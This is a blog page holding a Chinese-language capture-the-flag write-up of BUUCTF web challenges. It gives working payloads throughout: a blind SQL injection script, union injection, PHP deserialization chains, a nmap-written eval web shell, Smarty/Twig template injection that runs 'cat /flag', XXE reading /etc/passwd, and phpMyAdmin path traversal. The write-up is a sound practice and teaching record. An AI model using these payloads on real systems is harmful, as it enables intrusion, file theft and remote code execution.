<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta http-equiv=Content-Security-Policy content="upgrade-insecure-requests"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>BUUCTF WEB page2 | w8nn9z Blog</title><meta name=keywords content><meta name=description content="BUUCTF WEB page2 - w8nn9z Blog"><meta name=author content><link rel=canonical href=https://blog.w8nn9z.top/posts/ctf/buuojpage2/><link crossorigin=anonymous href=/assets/css/stylesheet.12a5629d0be5f885fd946d77257e55f74027ed2a35144a29e2db13f8f62b5f35.css integrity rel="preload stylesheet" as=style><link rel=icon href=https://blog.w8nn9z.top/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://blog.w8nn9z.top/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://blog.w8nn9z.top/favicon-32x32.png><link rel=apple-touch-icon href=https://blog.w8nn9z.top/apple-touch-icon.png><link rel=mask-icon href=https://blog.w8nn9z.top/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://blog.w8nn9z.top/posts/ctf/buuojpage2/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://blog.w8nn9z.top/posts/ctf/buuojpage2/"><meta property="og:site_name" content="w8nn9z Blog"><meta property="og:title" content="BUUCTF WEB page2"><meta property="og:locale" content="zh-cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-07-22T00:00:00+00:00"><meta property="article:modified_time" content="2025-07-30T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="BUUCTF WEB page2"><meta name=twitter:description content><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://blog.w8nn9z.top/posts/"},{"@type":"ListItem","position":2,"name":"CTF","item":"https://blog.w8nn9z.top/posts/ctf/"},{"@type":"ListItem","position":3,"name":"BUUCTF WEB page2","item":"https://blog.w8nn9z.top/posts/ctf/buuojpage2/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"BUUCTF WEB page2","name":"BUUCTF WEB page2","description":"","keywords":[],"articleBody":"[CISCN2019 华北赛区 Day2 Web1]Hack World fuzz发现空格，-等都被过滤，考虑布尔盲注，if判断为真返回1，查询id为1的数据：\nimport requests import string url = \"http://b9309530-9abc-44a2-ace2-f39ae7be8858.node5.buuoj.cn:81/index.php\" chars = r\"-{}\" + string.ascii_lowercase + string.digits flag = \"\" for i in range(1,40): for c in chars: asciiValue = ord(c) payload = f\"if(ascii(substr((select(flag)from(flag)),{i},1))={asciiValue},1,0)\" data = {\"id\":payload} resp = requests.post(url,data) if \"girlfriend\" in resp.text: flag += c print(f\"flag ==\u003e {flag}\") break flag{c1866cef-500f-403b-aec7-6d4d0898d8f3}\n[BSidesCF 2020]Had a bad day 传参?category=meowers123会报错：\nWarning: include(meowers123.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 37\rWarning: include(): Failed opening 'meowers123.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 37 传参?category=meo123wers无报错，但回显如下：\nSorry, we currently only support woofers and meowers. 猜测category中必须包含字符串woofers或meowers，先用伪协议+include规范化路径的特性获取index.php：\n?category=php://filter/read=convert.base64-encode/resource=meowers123.php/../index 只看被解析的php代码部分：\n\u003c?php $file = $_GET['category']; if(isset($file)) { if( strpos( $file, \"woofers\" ) !== false || strpos( $file, \"meowers\" ) !== false || strpos( $file, \"index\")){ include ($file . '.php'); } else{ echo \"Sorry, we currently only support woofers and meowers.\"; } } ?\u003e 没写flag在哪，猜测当前目录下存在flag.php\n?category=php://filter/read=convert.base64-encode/resource=meowers123.php/../flag flag.php：\n\u003c?php\r// flag{7fb88bcc-8a31-4dc9-96fc-5bbfdbb2a705}\r?\u003e [网鼎杯 2018]Fakebook 这题的环境好像有问题，注册一个账号，无法点击username进行跳转，服务器会崩溃\n不过还好能发现view.php，不带参数访问view.php，报错：\nNotice: Undefined index: no in /var/www/html/view.php on line 24\r[*] query error! (You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' at line 1)\rFatal error: Call to a member function fetch_assoc() on boolean in /var/www/html/db.php on line 66 尝试联合注入，过滤了union和select之间的空格，用注释符绕过即可：\n?no=-1 order by 5 --+\r[*] query error! (Unknown column '5' in 'order clause')\r?no=-1 union/**/select 1,2,3,4 --+\r2的位置有回显\r?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database() --+\rusers\r?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=\"users\" --+\rno,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS ?no=-1 union/**/select 1,passwd,3,4 from `users` --+\r3627909a29c31381a071ec27f7c9ca97726182aed29a7ddd2e54353322cfb30abb9e3a6df2ac2c20fe23436311d678564d0c8d305930575f60e2d3d048184d79\r?no=-1 union/**/select 1,data,3,4 from `users` --+\rO:8:\"UserInfo\":3:{s:4:\"name\";s:7:\"test123\";s:3:\"age\";i:18;s:4:\"blog\";s:15:\"www.test114.com\";} 没思路了，看了其他师傅的wp，有robots.txt：\nUser-agent: *\rDisallow: /user.php.bak \u003c?php class UserInfo { public $name = \"\"; public $age = 0; public $blog = \"\"; public function __construct($name, $age, $blog) { $this-\u003ename = $name; $this-\u003eage = (int)$age; $this-\u003eblog = $blog; } function get($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) { return 404; } curl_close($ch); return $output; } public function getBlogContents () { return $this-\u003eget($this-\u003eblog); } public function isValidBlog () { $blog = $this-\u003eblog; return preg_match(\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i\", $blog); } } 通过目录扫描得知存在flag.php，getBlogContents方法用于获取博客网站内容，将blog设为file:///var/www/html/flag.php即可获得flag.php源码\n\u003c?php class UserInfo { public $name = \"test\"; public $age = 18; public $blog = \"file:///var/www/html/flag.php\"; } print(urlencode(serialize(new UserInfo()))); ?\u003e O%3A8%3A%22UserInfo%22%3A3%3A%7Bs%3A4%3A%22name%22%3Bs%3A4%3A%22test%22%3Bs%3A3%3A%22age%22%3Bi%3A18%3Bs%3A4%3A%22blog%22%3Bs%3A29%3A%22file%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fflag.php%22%3B%7D 结合view.php中总是有unserialize的报错：\nNotice: unserialize(): Error at offset 0 of 1 bytes in /var/www/html/view.php on line 31 猜测是union select 1,2,3,4中某个位置应该是序列化数据，结合2对应username，data又是序列化数据，所以尝试将反序列化内容填入4的位置：\n?no=-1 union/**/select 1,2,3,'O%3A8%3A%22UserInfo%22%3A3%3A%7Bs%3A4%3A%22name%22%3Bs%3A4%3A%22test%22%3Bs%3A3%3A%22age%22%3Bi%3A18%3Bs%3A4%3A%22blog%22%3Bs%3A29%3A%22file%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fflag.php%22%3B%7D' --+ the contents of his/her blog\n解码base64得到flag.php源码：\n\u003c?php $flag = \"flag{dff96b7f-bc67-4717-9987-67882e4b14e3}\"; exit(0); 还有另一种方法，查看用户权限，发现是root：\n?no=-1 union/**/select 1,user,3,4 from mysql.user --+ 于是可以用load_file尝试读取文件：\n?no=-1 union/**/select 1,load_file(\"/var/www/html/flag.php\"),3,4 --+ [网鼎杯 2020 朱雀组]phpweb 上来就有报错：\nWarning: date(): It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected the timezone 'UTC' for now, but please set date.timezone to select your timezone. in /var/www/html/index.php on line 24\r2025-07-17 07:02:47 am 查看网页源码，发现有两个隐藏的传参func和p，猜测一个是函数名还有一个是参数，尝试先读取index.php的内容：\n?func=file_get_contents\u0026p=index.php ... \u003c?php $disable_fun = array(\"exec\",\"shell_exec\",\"system\",\"passthru\",\"proc_open\",\"show_source\",\"phpinfo\",\"popen\",\"dl\",\"eval\",\"proc_terminate\",\"touch\",\"escapeshellcmd\",\"escapeshellarg\",\"assert\",\"substr_replace\",\"call_user_func_array\",\"call_user_func\",\"array_filter\", \"array_walk\", \"array_map\",\"registregister_shutdown_function\",\"register_tick_function\",\"filter_var\", \"filter_var_array\", \"uasort\", \"uksort\", \"array_reduce\",\"array_walk\", \"array_walk_recursive\",\"pcntl_exec\",\"fopen\",\"fwrite\",\"file_put_contents\"); function gettime($func, $p) { $result = call_user_func($func, $p); $a= gettype($result); if ($a == \"string\") { return $result; } else {return \"\";} } class Test { var $p = \"Y-m-d h:i:s a\"; var $func = \"date\"; function __destruct() { if ($this-\u003efunc != \"\") { echo gettime($this-\u003efunc, $this-\u003ep); } } } $func = $_REQUEST[\"func\"]; $p = $_REQUEST[\"p\"]; if ($func != null) { $func = strtolower($func); if (!in_array($func,$disable_fun)) { echo gettime($func, $p); }else { die(\"Hacker...\"); } } ?\u003e ... 反序列化绕过disable_fun对func的限制，不知道为什么无法执行eval，尝试直接执行system(“whoami”)：\n?func=unserialize\u0026p=O%3A4%3A%22Test%22%3A2%3A%7Bs%3A1%3A%22p%22%3Bs%3A6%3A%22whoami%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3B%7D\rwww-data www-data find找到flag位置/tmp/flagoefiu4r93，再用cat读即可：flag{375cd5d4-9399-46b7-ab50-ab3ae8b4ab7a}\n[BJDCTF2020]The mystery of ip hint.php提示：Do you know why i know your ip?，试了试XFF，发现flag.php中的ip是通过XFF来获取拼接的，只想到了能XSS，可以通过标签指定language为PHP来rce：\n\u003cscript language=\"php\"\u003ephpinfo();\u003c/script\u003e 但是没回显，查了资料发现这种方法在PHP 7+中已经被移除了，本题PHP版本为7.3.13，没思路了\n看了wp说是smarty模板注入：\n{$smarty.version} #获取smarty的版本号\rYour IP is : 3.1.34-dev-7\r{php}phpinfo();{/php} #执行相应的php代码，但是Smarty3版本中已经废弃{php}标签，本题无法使用\r{literal}alert('xss');{/literal} #也是XSS，用来避免js被误解析\r{if phpinfo()}{/if} #Smarty的 {if} 条件判断和PHP的if非常相似，只是增加了一些特性。每个{if}必须有一个配对的{/if}，也可以使用{else} 和 {elseif}，全部的PHP条件表达式和函数都可以在if内使用，如||，or，\u0026\u0026，and，is_array()等等 {if system('cat /flag')}{/if}\rYour IP is : flag{f9a2b969-f4d4-4168-a4f5-137fb7f46b37} [BJDCTF2020]ZJCTF，不过如此 ?text=data:,I have a dream\u0026file=php://filter/read=convert.base64-encode/resource=next.php next.php：\n\u003c?php $id = $_GET['id']; $_SESSION['id'] = $id; function complex($re, $str) { return preg_replace( '/(' . $re . ')/ei', 'strtolower(\"\\\\1\")', $str ); } foreach($_GET as $re =\u003e $str) { echo complex($re, $str). \"\\n\"; } function getFlag(){ @eval($_GET['cmd']); } preg_replace /e模式导致第二个参数可以被当作php语句执行，foreach的参数是$_GET，因此没必要传id\n?.*=${phpinfo()}; 拼接后：\npreg_replace('(.*)/ei','strtolower(\"\\\\1\")','phpinfo();'); 但在php中当非法字符为首字母时，只有点号会被替换成下划线，所以换一个参数名即可，\\S表示匹配所有非空白符：\n?\\S*=${phpinfo()}; 在php中上面的payload等价于执行如下语句，花括号内为表达式，先执行表达式，再尝试访问$变量：\n\"${phpinfo()}\"; // ${expr} (variable variables) 由于引号会被转义，所以只能调用getFlag()，最终payload：\n?\\S*=${getFlag()};\u0026cmd=system('cat /flag'); flag{3ce52793-2870-4076-a120-b6931631542f}\n[BUUCTF 2018]Online Tool escapeshellarg和escapeshellcmd的联合使用 + 未将用户输入置于参数位\nescapeshellarg会在单引号之前加上 \\, 并在被转义的单引号两边和整个字符串两边加上单引号\nescapeshellcmd会在所有的 \\ 前加上 \\，并在单独的单引号（未成对的）前加 \\\n尝试将命令的输出结果保存到文件中，这样可以实现写入一句话木马\n一开始尝试了-oN，保存的文件内容中\"\\\u003c?php\".会导致php解析报错，无法拿shell：\n# Nmap 7.70 scan initiated Sat Jul 19 00:48:27 2025 as: nmap -T5 -sT -Pn --host-timeout 2 -F -oN aaa.php \\\u003c?php @eval($_POST[1]) ?\u003e \\\\\rFailed to resolve \"\\\u003c?php\".\rFailed to resolve \"eval($_POST[1])\".\rFailed to resolve \"?\u003e\".\rFailed to resolve \"\\\\\".\rWARNING: No targets were specified, so 0 hosts scanned.\r# Nmap done at Sat Jul 19 00:48:27 2025 -- 0 IP addresses (0 hosts up) scanned in 0.05 seconds 后来尝试-oG (Grepable 格式)，shell.php可以被解析\n?host='\u003c?php @eval($_POST[1]) ?\u003e -oG shell.php ' escapeshellarg后：\n''\\''\u003c?php @eval($_POST[1]) ?\u003e -oG shell.php '\\''' escapeshellcmd后（没有单独的单引号）：\n''\\\\''\u003c?php @eval($_POST[1]) ?\u003e -oG shell.php '\\\\''' 完整的执行命令：\nnmap -T5 -sT -Pn --host-timeout 2 -F \\\\\u003c?php @eval($_POST[1]) ?\u003e -oG shell.php \\\\ shell.php：\n# Nmap 7.70 scan initiated Sat Jul 19 00:53:51 2025 as: nmap -T5 -sT -Pn --host-timeout 2 -F -oG shell.php \\\u003c?php @eval($_POST[1]) ?\u003e \\\\\r# Nmap done at Sat Jul 19 00:53:51 2025 -- 0 IP addresses (0 hosts up) scanned in 0.06 seconds flag{a8339bf9-7e19-4606-9937-7b59a8e81acf}\n[GXYCTF2019]禁止套娃 访问.git响应码403，.git源码泄露：\npython GitHack.py http://287013c6-0b05-48bd-8df7-1b30898ed1a1.node5.buuoj.cn:81/.git/ index.php：\n\u003c?php include \"flag.php\"; echo \"flag在哪里呢？\n\"; if(isset($_GET['exp'])){ if (!preg_match('/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i', $_GET['exp'])) { if(';' === preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['exp'])) { if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) { // echo $_GET['exp']; @eval($_GET['exp']); } else{ die(\"还差一点哦！\"); } } else{ die(\"再好好想想！\"); } } else{ die(\"还想读flag，臭弟弟！\"); } } // highlight_file(__FILE__); ?\u003e 只允许执行形如func()的函数，考虑无参rce，随机爆出flag.php：\n?exp=var_dump(scandir(current(localeconv())));\rarray(5) { [0]=\u003e string(1) \".\" [1]=\u003e string(2) \"..\" [2]=\u003e string(4) \".git\" [3]=\u003e string(8) \"flag.php\" [4]=\u003e string(9) \"index.php\" } ?exp=highlight_file(array_rand(array_flip(scandir(current(localeconv())))));\r\u003c?php\r$flag = \"flag{49c2ad3e-a178-43b4-8abe-019245914871}\";\r?\u003e 看了其他师傅的wp，有稳定读出flag.php的方法：\n?exp=highlight_file(next(array_reverse(scandir(current(localeconv()))))); [NCTF2019]Fake XML cookbook xxe，username回显：\n\u003c!DOCTYPE user [ \u003c!ENTITY xxe SYSTEM \"file:///etc/passwd\"\u003e ]\u003e \u0026xxe;456 payload:\n\u003c!DOCTYPE user [ \u003c!ENTITY xxe SYSTEM \"file:///flag\"\u003e ]\u003e \u0026xxe;456 flag{9ee04b17-fc13-4ff2-a6c1-44fc20929f0b}\n[GWCTF 2019]我有一个数据库 直接访问得到乱码，其实是编码方式不统一导致的：\n鎴戞湁涓€涓暟鎹簱锛屼絾閲岄潰浠€涔堜篃娌℃湁~\r涓嶄俊浣犳壘\rGBK-\u003eUTF-8\r我有一个数据库，但里面什么也没有~\r不信你找 robots.txt：\nUser-agent: *\rDisallow: phpinfo.php 扫描发现有phpmyadmin，根据版本找找CVE：phpMyAdmin 4.8.1后台文件包含漏洞（CVE-2018-12613）\n目录穿越：\n?target=db_sql.php%253f/../../../../../../../../flag flag{f1cd2c40-be69-4549-ba63-d563837319d0}\n[BJDCTF2020]Mark loves cat .git源码泄露：\nindex.php：\n\u003c?php include 'flag.php'; $yds = \"dog\"; $is = \"cat\"; $handsome = 'yds'; foreach($_POST as $x =\u003e $y){ $$x = $y; } foreach($_GET as $x =\u003e $y){ $$x = $$y; } foreach($_GET as $x =\u003e $y){ if($_GET['flag'] === $x \u0026\u0026 $x !== 'flag'){ exit($handsome); } } if(!isset($_GET['flag']) \u0026\u0026 !isset($_POST['flag'])){ exit($yds); } if($_POST['flag'] === 'flag' || $_GET['flag'] === 'flag'){ exit($is); } echo \"the flag is: \".$flag; flag.php：\n\u003c?php $flag = file_get_contents('/flag'); 尝试传入?yds=flag，第二个foreach会执行$yds = $flag;，由于未传入flag参数，所以会执行exit($yds);输出flag：\nflag{2c9108b6-b53e-4aae-a2ae-fba4fc401577}\n[WUSTCTF2020]朴实无华 访问/fAke_f1agggg.php，header里有hint：\nlook_at_me：/fl4g.php fl4g.php：\n\u003cimg src=\"/img.jpg\"\u003e \u003c?php header('Content-type:text/html;charset=utf-8'); error_reporting(0); highlight_file(__file__); //level 1 if (isset($_GET['num'])){ $num = $_GET['num']; if(intval($num) \u003c 2020 \u0026\u0026 intval($num + 1) \u003e 2021){ echo \"鎴戜笉缁忔剰闂寸湅浜嗙湅鎴戠殑鍔冲姏澹�, 涓嶆槸鎯崇湅鏃堕棿, 鍙槸鎯充笉缁忔剰闂�, 璁╀綘鐭ラ亾鎴戣繃寰楁瘮浣犲ソ.\"; }else{ die(\"閲戦挶瑙ｅ喅涓嶄簡绌蜂汉鐨勬湰璐ㄩ棶棰�\"); } }else{ die(\"鍘婚潪娲插惂\"); } //level 2 if (isset($_GET['md5'])){ $md5=$_GET['md5']; if ($md5==md5($md5)) echo \"鎯冲埌杩欎釜CTFer鎷垮埌flag鍚�, 鎰熸縺娑曢浂, 璺戝幓涓滄緶宀�, 鎵句竴瀹堕鍘�, 鎶婂帹甯堣桨鍑哄幓, 鑷繁鐐掍袱涓嬁鎵嬪皬鑿�, 鍊掍竴鏉暎瑁呯櫧閰�, 鑷村瘜鏈夐亾, 鍒灏忔毚.\"; else die(\"鎴戣刀绱у枈鏉ユ垜鐨勯厭鑲夋湅鍙�, 浠栨墦浜嗕釜鐢佃瘽, 鎶婁粬涓€瀹跺畨鎺掑埌浜嗛潪娲�\"); }else{ die(\"鍘婚潪娲插惂\"); } //get flag if (isset($_GET['get_flag'])){ $get_flag = $_GET['get_flag']; if(!strstr($get_flag,\" \")){ $get_flag = str_ireplace(\"cat\", \"wctf2020\", $get_flag); echo \"鎯冲埌杩欓噷, 鎴戝厖瀹炶€屾鎱�, 鏈夐挶浜虹殑蹇箰寰€寰€灏辨槸杩欎箞鐨勬湸瀹炴棤鍗�, 涓旀灟鐕�.\"; system($get_flag); }else{ die(\"蹇埌闈炴床浜�\"); } }else{ die(\"鍘婚潪娲插惂\"); } ?\u003e 科学计数法+0e+${IFS}绕过：\n?num=2019e1\u0026md5=0e215962017\u0026get_flag=tac${IFS}fll* flag{49c90321-da30-42cb-90b6-f262f3e55eae}\n[BJDCTF2020]Cookie is so stable 注入点为Cookie中的user，尝试设置user={{2*2}}，flag.php页面回显4，确定是twig模板，相关文章：\nuser={{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"cat /flag\")}} flag{413ac946-069a-4427-88fc-de20189c7b40}\n[MRCTF2020]Ezpop \u003c?php class Modifier { protected $var = \"php://filter/read=convert.base64-encode/resource=flag.php\"; } class Show{ public $source; public $str; } class Test{ public $p; } $a = new Modifier(); $b = new Test(); $b-\u003ep = $a; $c = new Show(); $c-\u003estr = $b; $d = new Show(); $d-\u003esource = $c; print(urlencode(serialize($d))); ?\u003e payload：\n?pop=O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D flag.php：\n\u003c?php class Flag{ private $flag= \"flag{eee8f673-47ef-4f44-958d-17f89c32534b}\"; } echo \"Help Me Find FLAG!\"; ?\u003e [MRCTF2020]PYWebsite 验证码校验是写在前端的：\n\u003cscript\u003e function enc(code){ hash = hex_md5(code); return hash; } function validate(){ var code = document.getElementById(\"vcode\").value; if (code != \"\"){ if(hex_md5(code) == \"0cd4da0223c0b280829dc3ea458d655c\"){ alert(\"您通过了验证！\"); window.location = \"./flag.php\" }else{ alert(\"你的授权码不正确！\"); } }else{ alert(\"请输入授权码\"); } } \u003c/script\u003e 找个爆md5的网站，拿到验证码：ARandomString，不获取验证码直接访问flag.php也行\n说是只有购买者和自己才能看到flag，xff伪造一下本地ip即可拿到flag\nflag{68e4fd44-53c1-4aff-b8de-a6d00a360d67}\n[安洵杯 2019]easy_web img中的参数经过两次base64解码+hex得到555.png，考虑获取index.php：\n?img=TXpVek5UTTFNbVUzTURabE5qYz0 index.php：\n\u003c?php error_reporting(E_ALL || ~ E_NOTICE); header('content-type:text/html;charset=utf-8'); $cmd = $_GET['cmd']; if (!isset($_GET['img']) || !isset($_GET['cmd'])) header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0\u0026cmd='); $file = hex2bin(base64_decode(base64_decode($_GET['img']))); $file = preg_replace(\"/[^a-zA-Z0-9.]+/\", \"\", $file); if (preg_match(\"/flag/i\", $file)) { echo ''; die(\"xixi～ no flag\"); } else { $txt = base64_encode(file_get_contents($file)); echo \"\"; echo \"\n\"; } echo $cmd; echo \"\n\"; if (preg_match(\"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\\u0026[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|\u003c|\u003e/i\", $cmd)) { echo(\"forbid ~\"); echo \"\n\"; } else { if ((string)$_POST['a'] !== (string)$_POST['b'] \u0026\u0026 md5($_POST['a']) === md5($_POST['b'])) { echo `$cmd`; } else { echo (\"md5 is funny ~\"); } } ?\u003e md5绕过：\na=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2\u0026b=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2 可以用strings或者sort读取/flag绕过过滤，\nflag{1ca8c741-1ec0-4192-8af1-2d4cd7a962cf}\n[WesternCTF2018]shrine import flask import os app = flask.Flask(__name__) app.config['FLAG'] = os.environ.pop('FLAG') @app.route('/') def index(): return open(__file__).read() @app.route('/shrine/') def shrine(shrine): def safe_jinja(s): s = s.replace('(', '').replace(')', '') blacklist = ['config', 'self'] return ''.join(['\\{\\{% set {}=None%}}'.format(c) for c in blacklist]) + s return flask.render_template_string(safe_jinja(shrine)) if __name__ == '__main__': app.run(debug=True) 只对单独的config和self置None，用__globals__来访问current_app，再获取config：\nurl_for.__globals__['current_app'].config\rget_flashed_messages.__globals__['current_app'].config flag{0c4e9d3e-3ac6-425a-aa06-25b0a5830f08}\n[安洵杯 2019]easy_serialize_php index.php：\n\u003c?php $function = @$_GET['f']; function filter($img){ $filter_arr = array('php','flag','php5','php4','fl1g'); $filter = '/'.implode('|',$filter_arr).'/i'; return preg_replace($filter,'',$img); } if($_SESSION){ unset($_SESSION); } $_SESSION[\"user\"] = 'guest'; $_SESSION['function'] = $function; extract($_POST); if(!$function){ echo 'source_code'; } if(!$_GET['img_path']){ $_SESSION['img'] = base64_encode('guest_img.png'); }else{ $_SESSION['img'] = sha1(base64_encode($_GET['img_path'])); } $serialize_info = filter(serialize($_SESSION)); if($function == 'highlight_file'){ highlight_file('index.php'); }else if($function == 'phpinfo'){ eval('phpinfo();'); //maybe you can find something in here! }else if($function == 'show_image'){ $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo['img'])); } phpinfo中搜搜能找到d0g3_f1ag.php，base64编码：ZDBnM19mMWFnLnBocA==\n由于sha1无法直接控制$_SESSION[‘img’]，只能通过extract覆盖+字符逃逸的方式来控制img：\n_SESSION[user]=flagflagflagflagflagflag\u0026_SESSION[function]=A\";s:8:\"function\";s:4:\"test\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";} d0g3_f1ag.php：\n\u003c?php\r$flag = 'flag in /d0g3_fllllllag';\r?\u003e 最终payload：\n_SESSION[user]=flagflagflagflagflagflag\u0026_SESSION[function]=A\";s:8:\"function\";s:4:\"test\";s:3:\"img\";s:20:\"L2QwZzNfZmxsbGxsbGFn\";} flag{b654c7a0-5923-47fc-b843-341cbb593eee}\n[网鼎杯 2020 朱雀组]Nmap fuzz一下，输入'127.0.0.1;'，结果保存在/result.php?f=d9561：\nHost maybe down 随便改一下参数f报错：\nWarning: simplexml_load_file(): I/O warning : failed to load external entity \"xml/d951\" in /var/www/html/result.php on line 23\rWrong file name 再访问一下xml文档/xml/d9561，看看nmap结果具体写了什么进去：\n\u003c?xml version=\"1.0\"?\u003e \u003c!DOCTYPE nmaprun\u003e \u003c?xml-stylesheet href=\"file:///usr/bin/../share/nmap/nmap.xsl\" type=\"text/xsl\"?\u003e ","wordCount":"8534","inLanguage":"en","datePublished":"2025-07-22T00:00:00Z","dateModified":"2025-07-30T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.w8nn9z.top/posts/ctf/buuojpage2/"},"publisher":{"@type":"Organization","name":"w8nn9z Blog","logo":{"@type":"ImageObject","url":"https://blog.w8nn9z.top/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://blog.w8nn9z.top/ accesskey=h title="w8nn9z Blog (Alt + H)">w8nn9z Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://blog.w8nn9z.top/search title="搜索 (Alt + /)" accesskey=/><span>搜索</span></a></li><li><a href=https://blog.w8nn9z.top/posts title=文章><span>文章</span></a></li><li><a href=https://blog.w8nn9z.top/archives title=归档><span>归档</span></a></li><li><a 